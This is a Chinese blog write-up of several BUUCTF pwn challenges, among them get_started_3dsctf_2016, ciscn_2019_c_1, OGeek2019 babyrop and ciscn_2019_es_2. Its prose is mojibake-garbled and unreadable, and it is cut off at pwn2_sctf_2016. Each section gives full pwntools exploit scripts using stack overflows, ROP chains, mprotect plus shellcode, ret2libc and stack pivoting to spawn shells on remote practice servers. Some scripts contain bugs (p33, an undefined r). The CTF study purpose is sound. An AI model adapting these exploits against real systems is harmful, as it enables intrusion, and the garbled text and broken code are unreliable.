0x01IDAåˆ†æ `` æ–¹æ³•ä¸€ï¼šä¼ ç»Ÿæ ˆæº¢å‡º å¯ä»¥çœ‹åˆ°mainå‡½æ•°å¹¶æ²¡æœ‰ebpï¼Œå¯»å€æ–¹å¼æ˜¯espå¯»å€ get_flagå‡½æ•°ä¸­ï¼Œåœ¨è¯»å–flagä¹‹å‰å…ˆç»è¿‡ifåˆ¤æ–­a1 == 814536271 &amp;&amp; a2 == 425138641 æ„é€ payæ—¶ä¸å¯ä»¥è¯•å›¾è·³è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œæ— æ³•æ‰“é€š è¿”å›åœ°å€ä¸€å®šè¦è¦†ç›–ä¸ºget_flagå‡½æ•°çš„å¼€å§‹å¤„ åœ¨æ ˆä¸Šæ„é€ get_flagå‚æ•° payload = bâ€™aâ€™ * 0x38+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2) æ³¨æ„è¿™é‡Œçš„è¿”å›åœ°å€ä¸ºexitçš„åœ°å€ï¼Œæ‰“è¿œç¨‹æ—¶ï¼Œå¦‚æœç¨‹åºæ˜¯å¼‚å¸¸é€€å‡ºäº†ï¼Œæœ€åæ˜¯ä¸ç»™ä½ å›æ˜¾çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¾—æƒ³åŠæ³•è®©ç¨‹åºæ­£å¸¸é€€å‡º EXP1 from pwn import * context(os = 'linux', arch = 'i386', log_level = 'debug') #p = process('./get_started_3dsctf_2016') p = remote('node4.buuoj.cn',25669) get_flag_addr = 0x080489A0 exit_addr = 0x804E6A0 a1 = 0x308CD64F a2 = 0x195719D1 payload = b'a' * 0x38+p32(get_flag_addr)+p33(exit_addr)+p32(a1)+p32(a2) p.sendline(payload) p.interactive() 0x02æ–¹æ³•äºŒï¼šç³»ç»Ÿè°ƒç”¨ åˆ©ç”¨ROPgadgetæ‰¾åˆ°éœ€è¦çš„gadget pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°â€/bin/shâ€å­—ç¬¦ä¸²ï¼Œè€ƒè™‘åœ¨å…¶ä»–å¯„å­˜å™¨å†™å…¥/bin/shï¼Œå†èµ‹å€¼ç»™edx çœ‹çœ‹æœ‰æ²¡æœ‰ç±»ä¼¼çš„movæŒ‡ä»¤ mov_edx_eax_ret = 0x080557ab ä½ çŒœçŒœæˆ‘mov_edx_eax_retæ€ä¹ˆæ‰¾çš„ï¼ˆè£‚å¼€ï¼‰ å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å¤„æŒ‡ä»¤mov [edx], eax æ˜¯å°†eaxå¯„å­˜å™¨é‡Œçš„å€¼å†™åˆ°eedxæ‰€å­˜çš„åœ°å€å¤„[edx]ï¼Œæ”»å‡»çš„æ€è·¯å°±æ˜¯è®²[edx]åœ°å€è¦†ç›–ä¸º/bin/shå†™å…¥åœ°å€ï¼Œå¹¶åˆ©ç”¨eaxå¯„å­˜å™¨å°†å­—ç¬¦ä¸²/bin/shå­˜å…¥ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥ç¨‹åºæ²¡æœ‰ç»™å‡ºå¯ç”¨çš„bssæ®µå˜é‡ï¼Œæ ˆç©ºé—´ä¸€èˆ¬æƒ…å†µä¸‹å¼€å¯ASLRåœ°å€éšæœºï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨vmmapæŸ¥æ‰¾å¯è¯»çš„å†…å­˜ç©ºé—´ä½œä¸ºå…¥/bin/shçš„åœ°å€ è¿™ç¯‡å‚è€ƒçš„é“¾æ¥ï¼Œä½¿ç”¨0x080eb020 ä½œä¸ºå­˜æ”¾/bin/shçš„åœ°å€ï¼Œä½†æ˜¯ä½¿ç”¨vmmapå¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»¥è¿™ä¸ªåœ°å€å¼€å¤´æˆ–ç»“æŸçš„æ®µï¼Œè€Œä¸”ä¹Ÿä¸å­˜åœ¨å¯å†™å¯æ‰§è¡Œçš„æ®µï¼Œåªæœ‰0x80ea000åˆ°0x80ec000æ˜¯å¯å†™çš„æ–‡ä»¶æ®µï¼ˆå®é™…ä¸Š0x080eb020 ä¹Ÿåœ¨è¯¥æ®µä¸­ï¼‰ è¡¥å……ä¸€ä¸‹ï¼ŒåŒæ—¶å…¶å®æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥vmmapå‡ºæ¥çš„åœ°å€æ®µæ˜¯æ²¡æœ‰libcä¸­çš„å†…å®¹çš„ï¼Œå®é™…ä¸Šget_started_3dsctf_2016æ˜¯é™æ€é“¾æ¥ æ•´ä½“çš„ropæµç¨‹ä¸ºï¼Œåˆ†ä¸¤æ¬¡æ¯æ¬¡å››å­—èŠ‚å°†â€/binâ€ â€œ/sh\\x00â€å…ˆå­˜å…¥eaxï¼Œå†åˆ©ç”¨Popå°†edxç½®ä¸º0x80ea000ï¼Œå†åˆ©ç”¨movæŒ‡ä»¤å°†å­—ç¬¦ä¸²æ”¾å…¥è¯¥åœ°å€æŒ‡å‘ç©ºé—´ï¼Œæœ€åè¿”å›ç³»ç»Ÿè°ƒç”¨ from pwn import * local = 0 if local == 1: io = process('./get_started_3dsctf_2016') else: io = remote('node4.buuoj.cn',25878) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab w_addr = 0x80ea000#0x080eb020 payload = b'a'*56+p32(pop_eax_ret)+b'/bin'+p32(pop_edx_ecx_ebx_ret)+p32(w_addr)+p32(0)+p32(0)+p32(mov_edx_eax_ret) payload += p32(pop_eax_ret)+b'/sh\\x00'+p32(pop_edx_ecx_ebx_ret)+p32(w_addr+4)+p32(0)+p32(0)+p32(mov_edx_eax_ret) payload += p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(w_addr)+p32(int80) io.sendline(payload) io.interactive() ~ 0x03æ–¹æ³•ä¸‰ï¼šmprotectå‡½æ•°ä¿®æ”¹åœ°å€æƒé™ åˆ©ç”¨mprotect()å‡½æ•°æ¥ä¿®æ”¹å†…å­˜æƒé™ï¼Œä¸€èˆ¬æ˜¯å°†.bssç«¯ä¿®æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åé€šè¿‡read()å‡½æ•°å‘ç›®æ ‡å†…å­˜å†™å…¥shellcodeï¼Œç„¶ågetshell ï¼ˆå› ä¸ºæ˜¯é™æ€é“¾æ¥çš„ï¼Œæ‰€æœ‰çš„å‡½æ•°éƒ½ä¼šé“¾æ¥åˆ°ç¨‹åºï¼Œè‚¯å®šä¼šå­˜åœ¨ä¸€ä¸ªmprotectï¼ˆï¼‰å‡½æ•° ï¼‰ include &lt;sys/mman.h&gt; int mprotect(void *addr, size_t len, int prot);addrï¼šä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œaddrå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œç®€è€Œè¨€ä¹‹ä¸ºé¡µå¤§å°ï¼ˆä¸€èˆ¬æ˜¯ 4KB == 4096å­—èŠ‚ï¼‰æ•´æ•°å€ã€‚ lenï¼šè¢«ä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„é•¿åº¦,æœ€å¥½ä¸ºé¡µå¤§å°æ•´æ•°å€ã€‚ä¿®æ”¹åŒºåŸŸèŒƒå›´[addr, addr+len-1]ã€‚protï¼šå¯ä»¥å–ä»¥ä¸‹å‡ ä¸ªå€¼ï¼Œå¹¶å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§ç»“åˆèµ·æ¥ä½¿ç”¨ï¼š1ï¼‰PROT_READï¼šå†…å­˜æ®µå¯è¯»ï¼›2ï¼‰PROT_WRITEï¼šå†…å­˜æ®µå¯å†™ï¼›3ï¼‰PROT_EXECï¼šå†…å­˜æ®µå¯æ‰§è¡Œï¼›4ï¼‰PROT_NONEï¼šå†…å­˜æ®µä¸å¯è®¿é—®ã€‚è¿”å›å€¼ï¼š0ï¼›æˆåŠŸï¼Œ-1ï¼›å¤±è´¥ï¼ˆå¹¶ä¸”errnoè¢«è®¾ç½®ï¼‰1ï¼‰EACCESï¼šæ— æ³•è®¾ç½®å†…å­˜æ®µçš„ä¿æŠ¤å±æ€§ã€‚å½“é€šè¿‡ mmap(2) æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ä¸ºåªè¯»æƒé™æ—¶ï¼Œæ¥ç€ä½¿ç”¨ mprotect() æ ‡å¿—ä¸º PROT_WRITEè¿™ç§æƒ…å†µå°±ä¼šå‘ç”Ÿã€‚2ï¼‰EINVALï¼šaddrä¸æ˜¯æœ‰æ•ˆæŒ‡é’ˆï¼Œæˆ–è€…ä¸æ˜¯ç³»ç»Ÿé¡µå¤§å°çš„å€æ•°ã€‚3ï¼‰ENOMEMï¼šå†…æ ¸å†…éƒ¨çš„ç»“æ„ä½“æ— æ³•åˆ†é…ã€‚è¿™é‡Œçš„å‚æ•°protï¼š r:4 w:2 x:1 æˆ‘ä»¬é€šè¿‡vmmapå¯ä»¥çœ‹åˆ°0x080ea000åˆ°0x080ec000æ˜¯å¯è¯»å¯å†™ä½†æ˜¯ä¸å¯æ‰§è¡Œçš„ï¼ˆå¼€äº†NXä¿æŠ¤ï¼‰ï¼Œæ‰€ä»¥ç”¨mprotect()å°†è¿™ä¸€æ®µä¿®æ”¹æˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åé€šè¿‡read()ä¼ shellcodeåˆ°æ­¤å¤„ éœ€è¦æ³¨æ„çš„æ˜¯mprotectæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ï¼Œå¹¶ä¸”åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ï¼ˆ0x1000=4096ï¼‰ æˆ‘ä»¬çŸ¥é“32ä½è°ƒç”¨å‡½æ•°ä¸éœ€è¦å¯„å­˜å™¨ä¼ å‚ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦ç”¨popï¼Œretæ¥æ§åˆ¶ç¨‹åºè¿è¡Œæµç¨‹ï¼Œ ç”¨ ROPgadget éšä¾¿é€‰ä¸€ä¸ªæœ‰ä¸‰ä¸ªå¯„å­˜å™¨åŠ ä¸€ä¸ªretçš„gadget from pwn import * elf = ELF('./get_started_3dsctf_2016') sh = remote('node4.buuoj.cn',27364) #sh = process('./get_started_3dsctf_2016') context(os = 'linux', arch = 'i386', log_level = 'debug' , endian = 'little') #å°ç«¯åºï¼Œlinuxç³»ç»Ÿï¼Œ32ä½æ¶æ„,debug mprotect = 0x0806EC80 buf_addr = 0x80eb000 #è¦ä¿®æ”¹çš„å†…å­˜é¡µé¦–åœ°å€ buf_size = 0x1000 #è¦ä¿®æ”¹çš„å†…å­˜é¡µå¤§å° buf_prot = 0x7 #è¦ä¿®æ”¹çš„æƒé™ pop_3_ret = 0x08063adb #å¯„å­˜å™¨ä¼ å‚å¤–åŠ retè¿”å›readå‡½æ•°åœ°å€ #0x08063adb : pop edi ; pop esi ; pop ebx ; ret mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] read_addr = 0x0806E140 payload = b'a'*0x38 payload += p32(mprotect) #å…ˆå°†è¿”å›åœ°å€è¦†ç›–ä¸ºmprotectå‡½æ•°åœ°å€ payload += p32(pop_3_ret) #é€šè¿‡ä¸‰ä¸ªå¯„å­˜å™¨ä¼ å‚å†åŠ ä¸Šretè¿”å›æ ˆä¸Šä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ payload += p32(buf_addr) #è¦ä¿®æ”¹çš„å†…å­˜é¡µé¦–åœ°å€ payload += p32(buf_size) #è¦ä¿®æ”¹çš„å†…å­˜é¡µå¤§å° payload += p32(buf_prot) #è¦ä¿®æ”¹çš„æƒé™ payload += p32(read_addr) #retè¿”å›æ ˆä¸Šä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ä¸ºreadå‡½æ•°åœ°å€ payload += p32(buf_addr) #readå‡½æ•°çš„è¿”å›åœ°å€ payload += p32(0) #readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° payload += p32(buf_addr) #readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° payload += p32(0x100) #readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° sh.sendline(payload) shellcode = asm(shellcraft.sh(),arch='i386',os='linux') sh.sendline(shellcode) #readå‡½æ•°è¾“å…¥buf_addrçš„å­—ç¬¦ä¸² sh.interactive() 0x04å‚è€ƒæ–‡ç«  1 2 3 4 5 6 ciscn_2019_c_10x01ç®€å•çš„ret2libc3file checksec â€”â€” 64-bit å¼€NX 0x02è¿è¡Œä¸€ä¸‹çœ‹çœ‹ å†çœ‹çœ‹IDA ç ”ç©¶äº†åŠå¤©å‘ç°æ˜¯è®©ä½ åŠ è§£å¯†çš„å†çœ‹çœ‹string window æ²¡ç”¨systemå’Œbinshåˆå‘ç°åŠ å¯†å‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¯æ„æˆæ ˆæº¢å‡º 0x03åˆ†æå¤§è‡´æµç¨‹å°±æ˜¯ åˆ©ç”¨ä¸€ä¸ªç¨‹åºå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°å»æ³„éœ²å®ƒåœ¨ç¨‹åºä¸­çš„åœ°å€ï¼Œç„¶åå–æœ«å°¾3ä¸ªå­—èŠ‚ï¼Œå»æ‰¾åˆ°è¿™ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬ ç”¨åŒä¸€ä¸ªç¨‹åºé‡Œå‡½æ•°çš„åœ°å€-libcé‡Œçš„å‡½æ•°åœ°å€å³å¯å¾—åˆ°åç§»é‡ å¾—åˆ°åç§»é‡åå°±å¯ä»¥æ¨ç®—å‡ºç¨‹åºä¸­å…¶ä»–å‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“å…¶ä»–å‡½æ•°çš„åœ°å€ä¹‹åå°±å¯ä»¥å»æ‰§è¡Œsystemï¼ˆâ€™/bin/shâ€˜ï¼‰ 0x04å†™exp from pwn import* from LibcSearcher import* p=remote('node4.buuoj.cn',28342) elf=ELF('./ciscn_2019_c_1') main=0x400b28 pop_rdi=0x400c83 ret=0x4006b9 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(pop_rdi) payload+=p64(puts_got) payload+=p64(puts_plt) payload+=p64(main) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() puts_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) offset=puts_addr-libc.dump('puts') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(ret) payload+=p64(pop_rdi) payload+=p64(binsh) payload+=p64(system) p.sendlineafter('encrypted\\n',payload) p.interactive() 0x05libcsearchçš„githubç½‘å€å®‰è£… git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop è¦†ç›–æ•°æ®payload=bâ€™\\0â€™+bâ€™aâ€™*(0x50-1+8)\\0æ˜¯ä¸ºäº†è®©åŠ å¯†å‡½æ•°çš„ä¸€ä¸ªstrlenå‡½æ•°åœæ­¢ï¼ˆè¿™ä¸ªå‡½æ•°é‡â€˜0â€™ä¼šåœæ­¢ï¼‰ï¼Œä»è€Œç»•è¿‡åŠ å¯†ï¼Œä¿è¯æˆ‘ä»¬æ„é€ çš„ropä¸ä¼šè¢«ç ´åï¼Œbufçš„å¤§å°ä¸º0x50-1æ˜¯å‡å»\\0+8æ˜¯è¦†ç›–rbp è¿™é“é¢˜çš„æ¥æ”¶éå¸¸è®²ç©¶æ³„éœ²åœ°å€æ¥æ”¶æ—¶å…ˆæ˜¯ä¸¤ä¸‹recvline()ï¼ŒåŸå›  recvline()ä¸€æ¬¡æ¥æ”¶åˆ°\\n;ç¬¬ä¸€æ¬¡recvlineåªèƒ½åˆ°Ciphertextï¼›ç¬¬äºŒæ¬¡åªèƒ½æ¥æ”¶åˆ°0aç¬¬ä¸‰æ¬¡çš„recvuntilæ‰å¼€å§‹å¤„ç†æ³„éœ²çš„gotåœ°å€ã€‚å…ˆå¼€ä¸€ä¸‹context_log_lever=â€™debugâ€™ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ï¼Œ å†è‡ªå·±recvuntilçœ‹èƒ½æ¥æ”¶åˆ°ä»€ä¹ˆå†…å®¹ã€‚ ç„¶åå†ç”¨recvuntil(â€˜\\nâ€™)[:-1].ljust(8,â€™\\0â€™)æ¥èˆå¼ƒæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²æœ€åçš„â€™\\x0â€™å¹¶å‘å·¦è¡¥é½ è¿™ä¸€é“é¢˜æ˜¯64ä½çš„ç¨‹åºï¼Œè¿™è¾¹æ¶‰åŠåˆ°64ä½ç¨‹åºå’Œ32ä½ç¨‹åºè¿è¡Œæ—¶çš„åŒºåˆ«äº†32ä½ç¨‹åºè¿è¡Œæ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ç›´æ¥å»å†…å­˜åœ°å€å¯»å€æ‰§è¡Œ64ä½ç¨‹åºåˆ™æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å€ï¼Œå¯„å­˜å™¨å»å†…å­˜å¯»å€ï¼Œæ‰¾åˆ°åœ°å€è¿”å›ç»™ç¨‹åºã€‚å› æ­¤è¦ç”¨å¯„å­˜å™¨å­˜å‚ æ³¨æ„æ ˆå¯¹é½ è¿˜æœ‰æœ€åè¿˜è¦å†è¾“ä¸€ä¸ª0 å‚è€ƒèµ„æ–™ï¼š [BUUCTF]PWN6â€”â€”ciscn_2019_c_1 [OGeek2019]babyrop0x0164ä½ç¨‹åºï¼Œå¼€å¯NX æ²¡æœ‰systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸² 0x02åˆ†æç¨‹åºï¼š mainå‡½æ•°ä¸­ï¼Œå…ˆè¯»å–ä¸€ä¸ªéšæœºæ•°åˆ°fdï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ å…¥sub_804871Få‡½æ•°ï¼Œå†å°†sub_804871Få‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå‚æ•°ä¼ å…¥sub_80487D0å‡½æ•°é‡Œã€‚ mainå‡½æ•° sub_804871Få‡½æ•° sub_80487D0å‡½æ•° è§‚å¯Ÿç¨‹åºæˆ‘ä»¬å¯ä»¥å‘ç°sub_80487D0å‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´ ç„¶è€Œæƒ³è¦åˆ©ç”¨æ ˆæº¢å‡ºéœ€è¦æˆ‘ä»¬è¾¾æˆä¸¤ä¸ªç›®æ ‡ 1ã€ç»•è¿‡sub_804871Få‡½æ•°ä¸­çš„exitå‡½æ•°ï¼Œè¿™å°±è¦è®©strncmpçš„è¿”å›å€¼ä¸º0 2ã€è®©sub_80487D0å‡½æ•°ä¸­a1ï¼ˆå³buf[7]ï¼‰çš„ASCIIç å€¼å°½å¯èƒ½å¤§ï¼Œæ„é€ æ ˆæº¢å‡º 0x03é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œbufå’Œsæ•°ç»„å®Œå…¨ç›¸ç­‰æ—¶ï¼Œstrncmpå‡½æ•°è¿”å›0ï¼Œä½†æ˜¯sprinfå‡½æ•°å°†éšæœºæ•°åŠ åˆ°äº†sæ•°ç»„ä¸­ï¼Œbufä¸så¾ˆéš¾ç›¸ç­‰ã€‚ä¸è¿‡åœ¨v1ä¸º0çš„æ—¶å€™strncmpå‡½æ•°ä¹Ÿæ˜¯ä¼šè¿”å›0çš„ï¼Œè€Œv1æ˜¯è¯»å–çš„bufçš„å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶bufçš„ç¬¬ä¸€ä½ä¸ºâ€™\\x00â€™ï¼Œå¯èµ·åˆ°æˆªæ–­å­—ç¬¦ä¸²é•¿åº¦çš„æ•ˆæœã€‚ ç¬¬äºŒæ­¥ï¼Œè‹¥è¦åˆ©ç”¨æ ˆæº¢å‡ºret2libcæ³„éœ²writeå‡½æ•°åœ°å€çš„è¯ï¼Œèµ·ç éœ€è¦231+4+4*5 = 255ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è®©buf[7] = â€˜\\xffâ€™å³å¯ã€‚ä»£ç ä¸­çš„buf[v5-1] = 0æ”¹å˜çš„æ˜¯å­—ç¬¦ä¸²æœ«å°¾â€™\\x00â€™çš„å€¼ï¼Œä¸å½±å“buf[7] ã€‚ æ‰€ä»¥ç¬¬ä¸€æ¬¡è¯»å–çš„payloadä¸º payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") 0x04æ³¨æ„æœ¬é¢˜æä¾›äº†libcï¼Œç›´æ¥ä½¿ç”¨pwntoolså·¥å…·å³å¯ï¼Œä¸å¿…ä½¿ç”¨LibcSearcher mainå‡½æ•°åœ°å€ç”¨elf.sym[â€˜mainâ€™]æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œobjdump -tå‘½ä»¤æŸ¥çœ‹å‘ç°ç¨‹åºæ²¡æœ‰ç¬¦å·è¡¨ï¼ŒåŸå› åº”è¯¥æ˜¯å‡ºé¢˜äººä½¿ç”¨stripå‘½ä»¤å»ç¬¦å·è¡¨äº† å®Œæ•´exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') p = remote('node4.buuoj.cn',28188) #p = process('./pwn') elf = ELF('./pwn') libc = ELF('libc-2.23.so') payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") write_plt = elf.plt[\"write\"] write_got = elf.got[\"write\"] #main_addr = elf.plt['__libc_start_main'] main_addr = 0x8048825 payload1 = b'a'*0xe7+b'a'*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) p.sendline(payload1) write_addr = u32(p.recv(4)) #print(hex(write_addr)) libc_base = write_addr - libc.sym[\"write\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() p.sendline(payload) p.recvuntil(\"Correct\\n\") payload2 = b'a'*0xe7+b'a'*4+p32(system_addr)+p32(0)+p32(bin_sh_addr) p.sendline(payload2) p.interactive() ciscn_2019_es_20x0132ä½å¼€NXï¼Œæœ‰systemå‡½æ•°ï¼Œä½†æ˜¯éœ€è¦ä¼ å…¥binshã€‚ ç„¶è€Œï¼Œæ ˆä¸Šå˜é‡ s ä½äº ebp-0x28ï¼Œè€Œ read å‡½æ•°ä»…èƒ½è¯»å…¥0x30ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆè‹¥æƒ³å®æ–½ç¼“å†²åŒºæº¢å‡ºï¼Œåªæœ‰0x08 = 0x30-0x28ä¸ªå­—èŠ‚ä¾›æˆ‘ä»¬è¿›è¡Œå¸ƒå±€ã€‚å› æ­¤ï¼Œåœ¨åªæœ‰ ebp ä¸ ret èƒ½è¢«ç¯¡æ”¹çš„æ¡ä»¶ä¸‹å¯å°è¯•ä½¿ç”¨æ ˆè¿ç§»ã€‚ ç¨‹åºå­˜åœ¨leave retæŒ‡ä»¤ï¼Œå¹¶ä¸”å­˜åœ¨systemå‡½æ•°å¯æ‰§è¡Œ è€Œbinshåˆ™éœ€è¦åœ¨æ ˆä¸Šä¼ å…¥ Soï¼Œæˆ‘ä»¬æœ€ç»ˆè¦å°† espï¼ˆä¸ ebpï¼‰åŠ«æŒåˆ°å½“å‰æ ˆçš„å¦ä¸€åŒºåŸŸä¸Šï¼Œä»¥å®Œæˆä¼ ç»Ÿæ ˆæº¢å‡ºpayloadçš„å®æ–½ åœ¨æœ¬é¢˜ä¸­ï¼ŒåŠ«æŒç›®æ ‡åœ°å€å³ä¸ºç¼“å†²åŒºå˜é‡ s çš„èµ·å§‹åœ°å€ 0x02ç¬¬ä¸€æ­¥ï¼Œæ³„éœ²å‡ºebpï¼Œé€šè¿‡ebp+åç§»é‡çš„æ–¹æ³•è®¡ç®—æ ˆä¸Šåœ°å€printfå‡½æ•°åœ¨æœªé‡åˆ°â€\\x00â€æ—¶ä¼šä¸€ç›´è¾“å‡ºï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²å‡ºebpçš„å€¼ å› ä¸ºæ ˆä¸Šåœ°å€é—´çš„ç›¸å¯¹ä½ç½®æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥çš„ä½ç½®å’Œæ³„éœ²çš„ebpåœ°å€çš„åç§»æ¥å®šä½æˆ‘ä»¬çš„ç›®æ ‡åœ°å€ åœ¨ç¬¬äºŒæ¬¡è¾“å…¥readå‡½æ•°è¿”å›å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè®¡ç®—å¯å¾—æ³„éœ²ebpä¸ç¼“å†²åŒºèµ·å§‹ä½ç½®ç›¸è·0x38 ç¬¬äºŒæ­¥ æ ˆè¿ç§»ç²¾å¿ƒæ„é€ æ ˆä¸Šçš„å¸ƒå±€æ¥å®ç°æ ˆè¿ç§» 0x03æ­¤å¤„ç›—å›¾ï¼Œå·²æ ‡æ˜ ç”»æ ˆå›¾æœ‰åŠ©äºç†è§£æ•´ä¸ªæµç¨‹ æ•´ä¸ªé•¿æ¡è¡¨ç¤ºreadè¯»å…¥çš„å­—èŠ‚é•¿åº¦0x30ï¼Œold_ebpè¡¨ç¤ºæ³„éœ²çš„ebpï¼Œå‡å»0x38æŒ‡å‘çš„å°±æ˜¯å˜é‡sçš„èµ·å§‹ä½ç½®ï¼Œè¿”å›åœ°å€è¢«è¦†ç›–ä¸ºleav_retçš„åœ°å€ã€‚ ç¬¬ä¸€æ¬¡è‡ªå¸¦çš„leaveæŒ‡ä»¤æ‰§è¡Œåï¼Œebpçš„å€¼ä¸ºold_ebp - 0x38 ï¼ŒespæŒ‡å‘ç¯¡æ”¹çš„è¿”å›åœ°å€leave_retï¼›æ¥ç€æ‰§è¡ŒretæŒ‡ä»¤pop eipå†ä¸€æ¬¡æ‰§è¡Œleave ret ç¬¬äºŒæ¬¡leaveæŒ‡ä»¤æ‰§è¡Œåï¼ŒespæŒ‡å‘ebp+4ä¹Ÿå°±æ˜¯å›¾ä¸­â€™aaaaâ€™çš„ä¸‹ä¸€ä½ï¼Œebpçš„å€¼ä»ä¸ºold_ebp - 0x38 ï¼›æ­¤æ—¶å·²ç»å®Œæˆæ ˆè¿ç§»ã€‚æ¥ä¸‹æ¥retæŒ‡ä»¤å°†ebp+4å¼¹å…¥eipæ‰§è¡Œï¼Œæ‰€ä»¥åœ¨aaaaä¹‹åçš„åœ°å€éœ€è¦æ”¾ç½®æˆ‘ä»¬çš„systemå‡½æ•°å’Œbinsh binshå’Œå…¶åœ°å€éƒ½å¯ä»¥åœ¨è¿ç§»è¿‡åçš„æ ˆä¸Šå¸ƒå±€ 0x04exp from pwn import * p = remote(\"node4.buuoj.cn\", 28160) system_addr = 0x08048400 leave_ret = 0x080484b8 payload1 = b'A' * (0x27) + b'B' p.send(payload1) # not sendline p.recvuntil(\"B\") original_ebp = u32(p.recv(4)) print(hex(original_ebp)) payload2 = b'aaaa' # for location, start of hijaction payload2 += p32(system_addr) payload2 += b'dddd' # fake stack ebp payload2 += p32(original_ebp - 0x28) # addr of binsh payload2 += b'/bin/sh\\x00' # at ebp-0x28 payload2 = payload2.ljust(0x28, b'p') payload2 += p32(original_ebp - 0x38) # hijack ebp ,-0x38 is the aaaa payload2 += p32(leave_ret) # new leave ret p.sendline(payload2) p.interactive() å‚è€ƒåšå®¢ é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_ropç»å…¸ret2libc3 exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn') p = remote('node4.buuoj.cn',28146) elf = ELF('./pwn') main_addr = elf.sym['main'] plt_addr = elf.plt['write'] got_addr = elf.got['write'] pay1 = b'a'*(0x88+4)+p32(plt_addr)+p32(main_addr)+p32(1)+p32(got_addr)+p32(0xD) p.sendline(pay1) write_addr = u32(p.recv()[0:4])#0xf7db1190 print(\"write_addr = \",hex(write_addr)) libc=LibcSearcher('write',write_addr) offset=write_addr-libc.dump('write') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x88+4)+p32(system)+b'aaaa'+p32(binsh) p.sendline(pay2) p.interactive() pwn2_sctf_20160x0132ä½å¼€NXæ³„éœ²libc æ³¨æ„get_næ˜¯è‡ªå®šä¹‰å‡½æ•° 